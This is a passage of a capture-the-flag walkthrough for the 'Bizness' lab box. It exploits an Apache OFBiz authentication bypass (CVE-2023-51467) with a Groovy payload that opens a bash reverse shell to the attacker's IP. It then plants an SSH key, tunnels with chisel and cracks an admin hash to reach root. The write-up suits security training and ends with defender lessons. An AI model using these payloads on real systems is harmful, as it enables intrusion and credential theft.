PORT STATE SERVICE VERSION 68/udp open|filtered tcpwrapped 88/udp open|filtered kerberos-sec 514/udp open|filtered tcpwrapped 996/udp open|filtered tcpwrapped 1022/udp open|filtered tcpwrapped 1030/udp open|filtered tcpwrapped 1434/udp open|filtered tcpwrapped 1900/udp open|filtered tcpwrapped 49182/udp open|filtered tcpwrapped 49194/udp open|filtered unknown 49200/udp open|filtered unknown 49201/udp open|filtered unknown Note that these are either open or filtered. Likely just filtered, but they are noteworthy.
Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=bizness.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR OK, so it&rsquo;s running nginx 1.18.0. That&rsquo;s typical. There&rsquo;s also a redirect to an HTTPS version of the site (also shown in the nmap scans)
Next I performed vhost enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results from the vhost scan. Now I’ll check for subdomains of both http://bizness.htb and https://bizness.htb:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/subdomain-$DOMAIN.md -of md -timeout 4 -ic -ac -v # No result ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/subdomain-$DOMAIN.md -of md -timeout 4 -ic -ac -v # No result Still the only domain I know about is bizness.htb . I&rsquo;ll do directory enumeration next:
&#x1f914; To be honest, I still don&rsquo;t have a favourite directory enumeration tool:
Often, I favor ffuf for directory enumeration, for its extensive options. Other times, I like the simplicity of gobuster. And if I want to enumerate very deeply, I&rsquo;ll use feroxbuster.
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; OUTPUT=&#34;fuzzing/directory&#34; # This is what I often use: # ffuf -w $WLIST:FUZZ -u https://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o &#34;$OUTPUT.json&#34; -of json -timeout 4 -v # For simplicity, I used gobuster. Note the -k flag and exclusion of status 302 gobuster dir -k -w $WLIST -u https://$DOMAIN \\ --random-agent -t 10 --timeout 5s -f -e \\ --status-codes-blacklist 302,400,401,402,403,404,405 \\ --output &#34;$OUTPUT-$DOMAIN.txt&#34; \\ --no-error Directory enumeration against https://bizness.htb/ gave the following:
Since this is the only directory I found, I began additional directory enumeration of /control. However, since there were so many nuissance results to filter, I found it easier to do the same thing using ffuf:
ffuf -w $WLIST:FUZZ -u https://$DOMAIN/control/FUZZ -t 80 --recursion --recursion-depth 2 -c -o &#34;ffuf-$OUTPUT.json&#34; -of json -timeout 4 -v -c -fs 0 -fc 302 -fw 10468 Exploring the Website The /control directory appears to be running a separate product called OFBiz, an open source ERP software solution.
It&rsquo;s a bit hard to see from this image, but the footer shows that the site is running Apache OFBiz Release 18.12. Perhaps searchsploit has some additional info.
searchsploit OFBiz --id At first glance, exploit ID 12263 looks promising. But as you might have guessed from the very low ID number, this is an old exploit for a much earlier version. Also, the other exploits are all for vulnerabilities that have been patched by 18.12.
A quick web search showed some much, much more promising leads. Apparently, there was a 0-day reported for OFBiz mere weeks before this box&rsquo;s release?! &#x1f631; Take a look at one of the articles describing this vulnerability here. The vulnerability was tracked as CVE-2023-51467, but also that it could be coupled with CVE-2023-49070.
I took a quick look to see if some PoC code already existed. Sure enough, there were plenty of examples. All are variations on sending a request with an empty username and a bogus password, but with the requirePasswordChange=Y parameter. The first PoC code I found was this one, by K3ysTr0K3R.
To try it out, I cloned the repo, then set up a python venv and began installing dependencies for the script:
# clone the repo and change to that directory git clone https://github.com/K3ysTr0K3R/CVE-2023-51467-EXPLOIT.git cd CVE-2023-51467-EXPLOIT # set up the venv, so as not to clutter your main install python3 -m venv . source ./bin/activate pip3 install requests rich # run the PoC code python3 CVE-2023-51467.py --url https://bizness.htb I tried it for myself using a curl request:
curl -k https://bizness.htb/webtools/control/ping?USERNAME\\&amp;PASSWORD=test\\&amp;requirePasswordChange=Y PONG This reply indicates the test was successful. After reading through the vulnerability disclosure by Openwall, and the test cases that they used, it is clear that the important bit is the requirePasswordChange=Y portion. With that known, how can I take this a step further?
FOOTHOLD Authentication Bypass I&rsquo;ll try a login, proxied through Burp Repeater, then try again with this authentication bypass. First, a regular login attempt:
Next, I&rsquo;ll try authentication bypass:
Interesting. I think it worked. I was still presented with the &ldquo;username was empty reenter&rdquo; toast, but the login appears successful. I&rsquo;ll try again, this time just through Burp Proxy:
POST /control/login HTTP/1.1 Host: bizness.htb Cookie: OFBiz.Visitor=13237; JSESSIONID=B9F973F9877B23BE8ED0890B1A2FEB90.jvm1 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 [...snip...] Sec-Gpc: 1 Te: trailers Connection: close USERNAME&amp;PASSWORD=test&amp;requirePasswordChange=Y&amp;JavaScriptEnabled=Y &#x1f605; OK, mixed success! We have a partial authentication bypass, and we know that we can issue certain commands through the /webtools/control endpoint (ex. ping as an SSRF works). But if I use this authentication bypass for a simple login to the admin panel, I&rsquo;m presented with the Password Change screen - with no obvious way to circumvent that.
SSRF Using CVE-2023-51467 I did a little more research on this vulnerability, and how others were able to exploit it. Eventually, I found this article describing how to exploit the vulnerability in a nontrivial way. Apparently, most useful ways to form a reverse shell are actually blocked by the application sandboxing. But, for the lazy attacker, there is an easy way to make a bash reverse shell.
First, I open my firewall and start up a reverse shell:
sudo ufw allow from $RADDR to any port 4444 proto tcp bash # change to bash locally, so I can &#34;upgrade&#34; the shell later nc -lvnp 4444 Then, fire the payload:
curl -kv -H &#34;Host: bizness.htb&#34; \\ -d &#34;groovyProgram=x=new String[3];x[0]=&#39;bash&#39;;x[1]=&#39;-c&#39;;x[2]=&#39;bash -i &gt;%26 /dev/tcp/10.10.14.9/4444 0&gt;%261;&#39;;x.execute();&#34; \\ &#34;https://bizness.htb/webtools/control/ProgramExport/?requirePasswordChange=Y&amp;PASSWORD=password123&amp;USERNAME=jimbob&#34; Here it is, as a single line:
curl -kv -H &#34;Host: bizness.htb&#34; -d &#34;groovyProgram=x=new String[3];x[0]=&#39;bash&#39;;x[1]=&#39;-c&#39;;x[2]=&#39;bash -i &gt;%26 /dev/tcp/10.10.14.9/4444 0&gt;%261;&#39;;x.execute();&#34; &#34;https://bizness.htb/webtools/control/ProgramExport/?requirePasswordChange=Y&amp;PASSWORD=password123&amp;USERNAME=jimbob&#34; &#x1f914; It&rsquo;s unclear to me why the payload is only partially URL-encoded.
&#x1f44d; Great! looks like a functional reverse shell.
Optional: Upgrading the Shell First of all, switch to a regular bash shell. One convenient way to do that is by using Python, if it&rsquo;s on the target:
which python python3 perl bash # Python3 is present - use it python3 -c &#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34; export TERM=xterm-256color Now I have colors, tab completion, command recall, etc. Nice and comfy.
Optional: Plant an SSH Key A quick check of /etc/passwd reveals that ofbiz is not just a regular webserver &ldquo;user&rdquo;, they have a login shell and a home directory.
Since that&rsquo;s the case, I&rsquo;ll plant an SSH key so I can reconnect without having to re-exploit the CVE.
First, on my attacker box, generate a key and base-64 encode it:
# used passphrase &#34;flaming0&#34;: ssh-keygen -t rsa -b 4096 chmod 700 ./id_rsa # copy output to clipboard base64 -w 0 id_rsa.pub Then, on the target box, make an SSH directory and plant the key:
mkdir -p ~/.ssh cd ~/.ssh echo &#34;c3NoLXJz[...snip...]thbGkK&#34; | base64 -d &gt; authorized_keys Now back on the attacker box, go ahead and connect using SSH:
USER FLAG Just read it As previously noted, the user ofbiz is the only user with a home directory. They hold the flag. Whether you took the extra step to plant an SSH key or not, go read the flag now for some points :
cat /home/ofbiz/user.txt ROOT FLAG Enumeration Since this is an Easy box, I won&rsquo;t spend too much time delving into enumeration. Usually, something will stand out as a probably PE vector. But first, I should download my toolbox onto the target.
I&rsquo;ll stand up a python http server from my attacker machine to host my standard toolbox. I&rsquo;ll also start up a chisel server, just in case I need it later:
# Open up a firewall port for the http server # Also open a port for chisel server, just in case sudo ufw allow from $RADDR to any port 8000,9999 proto tcp cd ~/MyToolbox # Run chisel and background it (or just use another terminal window/tab) ./chisel server --port 9999 --reverse --key MyS3cr3tK3y &amp; # Start the webserver to serve the Toolbox to the target python3 -m http.server 8000 Then, on the target machine:
# Set up a hidden directory in tmp to download tools to mkdir -p /tmp/.Tools cd /tmp/.Tools # Download each tool that might be useful, such as chisel wget http://10.10.14.3:8000/chisel &amp;&amp; chmod 755 chisel wget linpeas.sh &amp;&amp; chmod +x linpeas.sh wget pspy &amp;&amp; chmod +x pspy # Form the proxy connection and background it ./chisel client 10.10.14.3:9999 R:1080:socks &amp; Now that I have my tools, I&rsquo;ll proceed with enumeration. I&rsquo;ll follow my usual Linux User Enumeration strategy. To keep this brief, I won&rsquo;t elaborate on the methodology of every step - I&rsquo;ll instead just show the key results:
ofbiz is the only user with a login shell and home directory. Target is running Java 11 and it is last on the $PATH ofbiz can write files pretty much only to their home directory and to /opt/ofbiz Target has some useful tools: nc, netcat, curl, wget, python3, perl netstat shows unexpected ports listening, 10523 and 36459: Port 10523 was observed during initial port scans, but was clearly being blocked by some kind of application sandboxing. Maybe Docker? Still unclear what 36459 might be. No unusual cron jobs; No unusual SUID/SGID executables; No files with extra capabilities added. linpeas found a very interesting result. Snippet below: If I could find a way to stop OFBiz and restart it, I could very easily create a root reverse shell by overwriting /opt/ofbiz/gradlew. However, I cannot use systemctl to stop the service (insufficient permissions). I&rsquo;ll keep an eye out for other methods for stopping/starting the service.
Ofbiz config files In hopes of finding some kind of database running for OFBiz, I went searching for anything that looked like a config file inside /opt/ofbiz. I came across several notable files:
/opt/ofbiz/INSTALL Looked interesting, but contents show nothing important.
/opt/ofbiz/Dockerfile This file contains a lot of the typical docker setup info. The most noteworthy thing is that it does not expose (or even mention) that suspicious port 10523.
/opt/ofbiz/docker/docker-entrypoint.sh Shows that the default credentials for OFBiz are ofbiz : ofbiz. Also, there is some info about connecting to a PostgresSQL database:
POSTGRES_DRIVER_URL=&#34;https://jdbc.postgresql.org/download/postgresql-42.5.4.jar&#34; Also, this file seems to show the hashing format for passwords:
# Concatenate a random salt and the admin password. SALT=$(tr --delete --complement A-Za-z0-9 &lt;/dev/urandom | head --bytes=16) SALT_AND_PASSWORD=&#34;\${SALT}\${OFBIZ_ADMIN_PASSWORD}&#34; # Take a SHA-1 hash of the combined salt and password and strip off any additional output form the sha1sum utility. SHA1SUM_ASCII_HEX=$(printf &#34;$SALT_AND_PASSWORD&#34; | sha1sum | cut --delimiter=&#39; &#39; --fields=1 --zero-terminated | tr --delete &#39;\\000&#39;) # Convert the ASCII Hex representation of the hash to raw bytes by inserting escape sequences and running through the printf command. Encode the result as URL base 64 and remove padding. SHA1SUM_ESCAPED_STRING=$(printf &#34;$SHA1SUM_ASCII_HEX&#34; | sed -e &#39;s/\\(..\\)\\.\\?/\\\\x\\1/g&#39;) SHA1SUM_BASE64=$(printf &#34;$SHA1SUM_ESCAPED_STRING&#34; | basenc --base64url --wrap=0 | tr --delete &#39;=&#39;) # Concatenate the hash type, salt and hash as the encoded password value. ENCODED_PASSWORD_HASH=&#34;\\$SHA\\$\${SALT}\\$\${SHA1SUM_BASE64}&#34; # Populate the login data template sed &#34;s/@userLoginId@/$OFBIZ_ADMIN_USER/g; s/currentPassword=\\&#34;.*\\&#34;/currentPassword=\\&#34;$ENCODED_PASSWORD_HASH\\&#34;/g;&#34; framework/resources/templates/AdminUserLoginData.xml &gt;&#34;$TMPFILE&#34; /opt/ofbiz/docker/send_ofbiz_stop_signal.sh Maybe this is exactly what I need to stop the server. But how to restart it? After reading through it, I see that this script works by communicating with some &ldquo;admin port&rdquo;. I&rsquo;ll investigate more on this below &#x1f6a9;
That last part of docker-entrypoint.sh looked interesting, so I tried running grep over the ofbiz files, looking for &ldquo;currentPassword=&rdquo;:
find /opt/ofbiz -maxdepth 4 -type f -exec grep &#34;currentPassword=&#34; {} + But the only result was demo data. That, plus a record showing the authentication bypass had occurred. However, now that I see the format for the password hashes, I&rsquo;ll take a deeper look:
find . -maxdepth 6 -type f -exec grep &#34;{SHA}&#34; {} + | grep -iv demo ./runtime/logs/ofbiz-2023-12-16-2.log:2023-12-16 03:44:21,359 |jsse-nio-8443-exec-4 |HashCrypt |W| Warning: detected oldFunnyHex password prefixed with a hashType; this is not valid, please update the value in the database with ({SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a) ./runtime/logs/ofbiz-2023-12-16-2.log:2023-12-16 03:44:54,216 |jsse-nio-8443-exec-8 |HashCrypt |W| Warning: detected oldFunnyHex password prefixed with a hashType; this is not valid, please update the value in the database with ({SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a) ./runtime/logs/ofbiz-2023-12-16-2.log:2023-12-16 03:44:54,220 |jsse-nio-8443-exec-8 |HashCrypt |W| Warning: detected oldFunnyHex password prefixed with a hashType; this is not valid, please update the value in the database with ({SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a) ./framework/resources/templates/AdminUserLoginData.xml: &lt;UserLogin userLoginId=&#34;@userLoginId@&#34; currentPassword=&#34;{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a&#34; requirePasswordChange=&#34;Y&#34;/&gt; grep: ./build/distributions/ofbiz.tar: binary file matches ./plugins/example/testdef/assertdata/TestUserLoginData.xml: &lt;UserLogin userLoginId=&#34;admin&#34; currentPassword=&#34;{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a&#34;/&gt; Ok, it mentions that one hash, 47b56994cbc2b6d10aa1be30f70165adb305a41a, a few times. I&rsquo;ll run it through name-that-hash and see what it turns up:
name-that-hash -t &#39;47b56994cbc2b6d10aa1be30f70165adb305a41a&#39; Even though it lists the format under &ldquo;Least Likely&rdquo;, we know the format should be sha1($salt.$pass), which is hashcat mode 110. However, that mode requires a separator between the salt and the hash. So which part is the salt? If you take a look at the contents of docker-entrypoint.sh, the whole algorithm is there:
SALT = Generate 16 random bytes Concatenate SALT+Password and run that through sha1sum. Then transform it to ASCII. Convert ASCII representation to URL-encoded base64 Concatenate SALT+B64HASH In short, the resulting format is most like $salt.sha1($salt.$pass)
Let&rsquo;s shortcut this whole process by taking that script and adding some echo to it:
# Use an arbitrary password OFBIZ_ADMIN_PASSWORD=&#34;ofbiz&#34; # Concatenate a random salt and the admin password. SALT=$(tr --delete --complement A-Za-z0-9 &lt;/dev/urandom | head --bytes=16) SALT_AND_PASSWORD=&#34;\${SALT}\${OFBIZ_ADMIN_PASSWORD}&#34; # Take a SHA-1 hash of the combined salt and password and strip off any additional output form the sha1sum utility. SHA1SUM_ASCII_HEX=$(printf &#34;$SALT_AND_PASSWORD&#34; | sha1sum | cut --delimiter=&#39; &#39; --fields=1 --zero-terminated | tr --delete &#39;\\000&#39;) # Convert the ASCII Hex representation of the hash to raw bytes by inserting escape sequences and running # through the printf command. Encode the result as URL base 64 and remove padding. SHA1SUM_ESCAPED_STRING=$(printf &#34;$SHA1SUM_ASCII_HEX&#34; | sed -e &#39;s/\\(..\\)\\.\\?/\\\\x\\1/g&#39;) SHA1SUM_BASE64=$(printf &#34;$SHA1SUM_ESCAPED_STRING&#34; | basenc --base64url --wrap=0 | tr --delete &#39;=&#39;) # Concatenate the hash type, salt and hash as the encoded password value. ENCODED_PASSWORD_HASH=&#34;\\$SHA\\$\${SALT}\\$\${SHA1SUM_BASE64}&#34; echo &#34;Salt: $SALT (\`echo -n $SALT | wc --chars\` chars)&#34; echo &#34;Base-64: $SHA1SUM_BASE64 (\`echo -n $SHA1SUM_BASE64 | wc --chars\` chars)&#34; echo &#34;Together: $ENCODED_PASSWORD_HASH&#34; Just to give an idea of what I&rsquo;m looking for, I ran the above script and got:
Salt: PVfRZDQlsmFCqUhb Base-64: o6du6DJEkP2K4XNmcfa6fqatObc Together: $SHA$PVfRZDQlsmFCqUhb$o6du6DJEkP2K4XNmcfa6fqatObc That&rsquo;s good to know. I&rsquo;ll keep an eye out for a hash in this format as I continue to look for a way to escalate to root &#x1f6a9;
Aside: send _ofbiz_stop_signal The send_ofbiz_stop_signal.sh script has some interesting contents:
#[...snip] echo &#34;Getting admin port and key...&#34; START_PROPERTIES_CONTENT=$(cat /ofbiz/framework/start/src/main/resources/org/apache/ofbiz/base/start/start.properties) OFBIZ_ADMIN_PORT=$(getPropertyValue &#34;$START_PROPERTIES_CONTENT&#34; &#34;ofbiz.admin.port&#34;) echo Admin port: $OFBIZ_ADMIN_PORT; OFBIZ_ADMIN_KEY=$(getPropertyValue &#34;$START_PROPERTIES_CONTENT&#34; &#34;ofbiz.admin.key&#34;) echo Admin key: $OFBIZ_ADMIN_KEY; echo &#34;Sending shutdown signal...&#34; echo &#34;$OFBIZ_ADMIN_KEY:SHUTDOWN&#34; | curl telnet://localhost:$OFBIZ_ADMIN_PORT echo &#34;Done&#34; It reads the admin port and admin key from the start.properties file. Then, on the second last line, it shows how it uses those properties. It sends a single message, &ldquo;[ADMIN_KEY]:SHUTDOWN&rdquo;, over telnet protocol to the admin port. If I knew what the admin key was, I could try this out for myself.
However, note the path to the start.properties file. It doesn&rsquo;t exist on this box. However, there is a start.properties file at a very similar path: /opt/ofbiz/framework/start/src/main/java/org/apache/ofbiz/base/start/start.properties.
&#x261d;&#xfe0f; Just add /opt to the start of the path, and replace resources with java.
Let&rsquo;s take a look at the start.properties file:
# --- OFBiz startup loaders comma separated ofbiz.start.loaders=main # [...snip...] # --- Network host, port and key used by the AdminClient to communicate # with AdminServer for shutting down OFBiz or inquiring on status # Default ofbiz.admin.host 127.0.0.1 # Default ofbiz.admin.port 0 # Default ofbiz.admin.key NA #ofbiz.admin.host= ofbiz.admin.port=10523 ofbiz.admin.key=so3du5kasd5dn # -- Enable the JVM shutdown hook. Default is true #ofbiz.enable.hook=false # [...snip...] &#x1f601; Well there we go; very interesting&hellip; That mysterious &ldquo;admin port&rdquo; is none other than 10523! Also, now we know the admin key.
At this point, I am thankful that I went ahead and planted an SSH key. Assuming this send_ofbiz_stop_signal.sh script does what it looks like it does, and if I&rsquo;m successful in shutting down OFBiz, it will terminate the original reverse shell along with it. However, with my SSH connection I can happily sit on the box, and watch the whole operation unfold using pspy &#x1f609;
So, let&rsquo;s give it a go. From my attacker box (via the socks5 proxy I established using chisel), I&rsquo;ll send the command it&rsquo;s expecting. Meanwhile, on the target box, I&rsquo;ll watch pspy.
# on target: timeout 5m /tmp/.Tools/pspy # on attacker: proxychains echo &#34;so3du5kasd5dn:SHUTDOWN&#34; | curl telnet://localhost:10523 Hmm, that didn&rsquo;t work. But with a slight modification&hellip;
proxychains telnet 127.0.0.1 Worked perfectly! As soon as I issued that command, I saw the following appear on pspy:
Unfortunately, all we see being ran as root is the line shown at the top: (gradlew)
Moreover, it seems that there is no periodic process to re-start the box after it is shut down. Recall that earlier, during enumeration, linpeas found that the ofbiz.service is running gradlew from a writable location; if I could find a way to shut down then restart OFBiz, it was likely that this would be the PE vector.
&#x1f61e; However, since OFBiz seems to not have any mechanism to turn it back on, my whole attempt with send_ofbiz_stop_signal may have only succeeded in breaking the box. I will keep this idea in mind, but start pursuing other options &#x1f6a9;
I&rsquo;ll restart the box now, re-exploit, once again plant an ssh key and download my toolbox &#x1f926;&zwj;&#x2642;&#xfe0f;
Searching for a Database This box is running OFBiz, an open source ERP software. By it&rsquo;s nature, it definitely needs some kind of database to function properly. So far, I&rsquo;ve seen mentions of database credentials inside the Docker files, but no actual database &#x1f914;
There&rsquo;s a very good tool for finding these types of things (passwords, secrets, database connection strings, etc), called Trufflehog. It&rsquo;s easiest to run it locally, but it&rsquo;s also quite large, so I don&rsquo;t often download it alongside the rest of my toolbox. I&rsquo;ll grab it now and run it:
cd /tmp/.Tools wget http://10.10.14.9:8000/trufflehog &amp;&amp; chmod u+x trufflehog for d in /etc /opt /usr /home /var; do ./trufflehog filesystem $d 2&gt;/dev/null | tee -a trufflehog-out.txt; done It tends to spit out a lot of surplus info (false positives), but it is very thorough. After a minute or so, it found some hints at a database connection:
Found unverified result 🐷🔑❓ Detector Type: JDBC Decoder Type: PLAIN Raw result: jdbc:mysql://127.0.0.1/ofbiz_odbc?autoReconnect=true&amp;amp;characterEncoding=UTF-8 File: /opt/ofbiz/build/distributions/ofbiz.zip Line: 52 Found unverified result 🐷🔑❓ Detector Type: JDBC Decoder Type: PLAIN Raw result: jdbc:postgresql://127.0.0.1/ofbiz File: /opt/ofbiz/build/distributions/ofbiz.zip Line: 85 Found unverified result 🐷🔑❓ Detector Type: JDBC Decoder Type: PLAIN Raw result: jdbc:mysql://127.0.0.1/ofbizolap?autoReconnect=true&amp;amp;characterEncoding=UTF-8 File: /opt/ofbiz/build/libs/ofbiz.jar Line: 207 Found unverified result 🐷🔑❓ Detector Type: JDBC Decoder Type: PLAIN Raw result: jdbc:sqlserver://localhost:1791;databaseName=ofbiz;SelectMethod=cursor; File: /opt/ofbiz/framework/entity/config/entityengine.xml Line: 136 So it seems like OFBiz is able to use MySQL, PostgresSQL, Derby, and several other types of databases.
Checking /opt/ofbiz/build/distributions, I see two files: ofbiz.tar and ofbiz.zip. I&rsquo;ll transfer them to my attacker box and see what&rsquo;s inside. They&rsquo;re very large though (406MB for the .tar file), so I&rsquo;ll use scp.
scp -i id_rsa ofbiz@$RADDR:/opt/ofbiz/build/distributions/ofbiz.tar ./ofbiz.tar &#x1f915; 45 minutes estimated to download. What is this, Y2K?
Note to self: delete this stuff when I&rsquo;m done the box. Disk space doesn&rsquo;t grow on trees!
Unfortunately, after extensive search through ofbiz.tar I didn&rsquo;t find anything that I hadn&rsquo;t already found while enumerating the target box. &#x1f61e;
Back on the target box, I kept searching. I decided to look for signs of each type of database that Trufflehog found a connection string for. There clearly was not a postgres or MySQL database (there are no listening ports for either of those) - so what is it?
&#x1f6a8; After quite a bit of manually milling through files, I finally found a Derby database! It&rsquo;s located in /opt/ofbiz/runtime/data. I immediately archived the directory and copied it over to my attacker box:
# On the target box: tar -czvf derby.tar.gz ./data mv derby.tar.gz /tmp/.Tools # On the attacker box: scp -i id_rsa ofbiz@$RADDR:/tmp/.Tools/derby.tar.gz ./derby.tar.gz tar -zxvf derby.tar.gz A little bit of research pointed out that the appropriate tool for accessing a Derby database would be ij, part of the derby-tools package.
sudo apt install derby-tools ij &gt; connect &#39;jdbc:derby:/home/kali/Box_Notes/Bizness/derby-tar/data/derby/ofbiz;create=false&#39;; &gt; show tables; # Hundreds of tables are listed, including a few about USER_LOGIN &gt; describe USER_LOGIN; # It claims this is not a valid table? &gt; describe OFBIZ.USER_LOGIN; # Aha, that worked. &gt; SELECT USER_LOGIN_ID, CURRENT_PASSWORD, PASSWORD_HINT FROM OFBIZ.USER_LOGIN; # Finally, some results! # admin | $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I | NULL Excellent! Finally a hash in the format I&rsquo;ve been looking for!
Optionally, you can also use a GUI database tool like DBeaver. This is actually what I did first, but I thought ij was a cleaner solution. For DBeaver, simply define a new Connection, choose Derby Embedded, then locate the database from the Edit Connection window. The directory you want to locate is ./data/derby/ofbiz.
Cracking the admin hash The hash recovered from the Derby database was $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I. Fitting that into the format observed earlier (from the docker-entrypoint.sh script), that means:
The salt is d I had thought it would be 16 characters, but oh well. the base64(sha1($salt.$pass)) part is uP0_QaVBpDWFeo8-dRzDqRwXQ2I So, to proceed, I&rsquo;ll need to undo the steps that were done by:
printf &quot;$SHA1SUM_ESCAPED_STRING&quot; | basenc --base64url --wrap=0 | tr --delete '=' printf &quot;$SHA1SUM_ASCII_HEX&quot; | sed -e 's/\\(..\\)\\.\\?/\\\\x\\1/g' printf &quot;$SALT_AND_PASSWORD&quot; | sha1sum | cut --delimiter=' ' --fields=1 --zero-terminated | tr --delete '\\000' Undoing step 1: basenc can be undone simply by adding a -d flag do it. The trick is to undo the tr --delete '=' first. I&rsquo;ll try decoding the text with 0, 1, or 2 trailing &ldquo;=&rdquo;. One of them should produce valid output:
# The winner is: 1 equals sign echo -n &#39;uP0_QaVBpDWFeo8-dRzDqRwXQ2I=&#39; | basenc -d --base64url --wrap=0 # output is: ��?A�A�5�z�&gt;uéCb Undoing step 2: This step just removes escape sequences. However, we can do the same thing by just converting it to raw hex:
echo -n &#39;uP0_QaVBpDWFeo8-dRzDqRwXQ2I=&#39; | basenc -d --base64url --wrap=0 | xxd -ps # output is: b8fd3f41a541a435857a8f3e751cc3a91c174362 Undoing step 3: This step is the actual hashing. I&rsquo;ll need to prepare a file for hashcat to work with, then simply choose the right mode. Hashcat expects the hashes to be in a [hash]:[salt] format:
echo -n &#34;b8fd3f41a541a435857a8f3e751cc3a91c174362:d&#34; &gt; admin_hash.txt # Name-that-hash already pointed out that the mode should be &#39;110&#39; for sha1($s.$p) hashcat -m 110 admin_hash.txt /usr/share/wordlists/rockyou.txt Unfortunately, this did not find a hash. Why not try john instead?
# Add the hash into the file in the format john expects echo -n &#39;b8fd3f41a541a435857a8f3e751cc3a91c174362$d&#39; &gt;&gt; admin_hash.txt # Check what mode to use john --list=subformats | grep sha1 # looks like dynamic_25 is correct john --wordlist=/usr/share/wordlists/rockyou.txt --format=dynamic_25 admin_hash.txt &#x1f601; Bingo! Now, I just need to escalate privilege
sudo su # noop su # yepp &#x1f435; There&rsquo;s the root shell. Just cat the flag for those hard-earned points!
cat /root/root.txt I&rsquo;d like to give a quick thank-you to someone (that would like to remain anonymous) who helped me get un-stuck at one part of this privesc on this box. Thanks again!
LESSONS LEARNED Attacker Some software is huge. Some big, multi-purpose products like OFBiz are very large and full of sample/demo files. All of these files can be quite distracting; finding things manually can be especially tedious. Find ways to deal with the scale by utilizing things like grep and scripting. Try the other hash cracker. john not working? Try hashcat. hashcat not working? Try john. If you&rsquo;re just using a CPU for cracking, there&rsquo;s really no advantage of either. Don&rsquo;t follow linpeas blindly. This goes for other auto-enumeration tools as well: they aren&rsquo;t infallible. On this box, linpeas pointed the attacker at a writable binary that is called by the ofbiz service. However, in attempting to reset the service, the whole box becomes inaccessible to other players. Not cool! Big scans should guide your manual enumeration. On this box, I used Trufflehog extensively. While it produced a lot of false-positives, it was very useful in building a shortlist of things I wanted to loop-back to and investigate manually. Defender Rate-limit the webserver. It won&rsquo;t prevent nefarious activity, but it will definitely raise the bar for how difficult enumeration is. Even a simple action like rate-limiting is effective at deterring hackers with little means to launch a distributed attack. Disable risky APIs. I have to struggle to think of a legitimate reason by /webtools/control was exposed to the internet at all. Whenever possible, minimize the attack surface (as much as the customer/stakeholder can allow). Never allow a binary that is ran by a service to be in a writable location of a low-privilege user. It was irresponsible to allow ofbiz to have write access to the whole /opt/ofbiz directory; their write access could have been limited to a few key locations. Avoid password re-use. On this box, the root user had the same password as the &ldquo;admin&rdquo; user for OFBiz (an internet-facing application). It&rsquo;s best to use other forms of authentication (a hardware token, perhaps), but at the very least, never re-use passwords. This goes double for applications that cross a trust barrier. `,url:"https://4wayhandshake.github.io/walkthrough/bizness/"},"https://4wayhandshake.github.io/walkthrough/devvortex/":{title:"Devvortex",tags:["Joomla","CVE","MySQL","Password Cracking","Apport","Pager"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Currently, Devvortex is still active and worth some points. The box revolves around a fictional web development company, and their landing page. A small amount of enumeration and a check for CVEs leads directly to an easy foothold. From there, good fundamentals will allow you to achieve the User flag with ease, then the root flag with even greater ease!
This box is perfect for anyone looking to get started in HTB, or someone (like me) who wants to renew their skills after a long hiatus. The biggest danger on this box is to accidentally over-think it &#x1f609;
RECON nmap scans For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
